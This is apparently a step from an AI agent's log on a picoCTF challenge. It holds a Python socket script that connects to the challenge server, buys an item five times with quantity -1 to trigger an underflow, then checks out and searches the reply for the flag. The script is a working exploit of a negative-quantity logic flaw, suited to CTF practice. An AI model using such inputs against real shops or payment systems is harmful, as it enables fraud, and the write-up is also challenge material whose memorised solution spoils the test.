- 目的: 编写一个不依赖pwntools的Python脚本，使用socket库精确处理与服务器的交互，通过多次购买负数物品触发下溢，然后结账以获取flag。
- 命令: {"tool": "sandbox_python_exec", "purpose": "编写一个不依赖pwntools的Python脚本，使用socket库精确处理与服务器的交互，通过多次购买负数物品触发下溢，然后结账以获取flag。", "arguments": {"code": "import socket\nimport time\nimport sys\nimport re\n\ndef solve():\n    host = 'wily-courier.picoctf.net'\n    port = 63823\n    \n    try:\n        # 建立连接\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((host, port))\n        \n        # 接收初始欢迎和菜单\n        data = s.recv(4096)\n        print(data.decode(), end='')\n        \n        # 执行5次购买：选择选项1，输入数量-1\n        # 每次交互：发送选项 -> 等待数量提示 -> 发送数量 -> 等待新菜单\n        for i in range(5):\n            # 发送购买选项 1\n            s.sendall(b'1\\n')\n            time.sleep(0.2)\n            data = s.recv(4096)\n            print(data.decode(), end='')\n            \n            # 发送数量 -1\n            s.sendall(b'-1\\n')\n            time.sleep(0.2)\n            data = s.recv(4096)\n            print(data.decode(), end='')\n            \n        # 发送结账选项 5\n        s.sendall(b'5\\n')\n        time.sleep(0.2)\n        data = s.recv(4096)\n        print(data.decode(), end='')\n        \n        # 关闭连接\n        s.close()\n        \n        # 检查输出中是否包含 flag\n        output = data.decode()\n        if 'picoCTF{' in output:\n            flag_match = re.search(r'picoCTF\\{[^}]+\\}', output)\n            if flag_match:\n                print(f\"\\nFound Flag: {flag_match.group(0)}\")\n        else:\n            print(\"\\nFlag not found in this output, check the logs above.\")\n            \n    except Exception as e:\n        print(f\"Error: {e}\")\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    solve()"}}
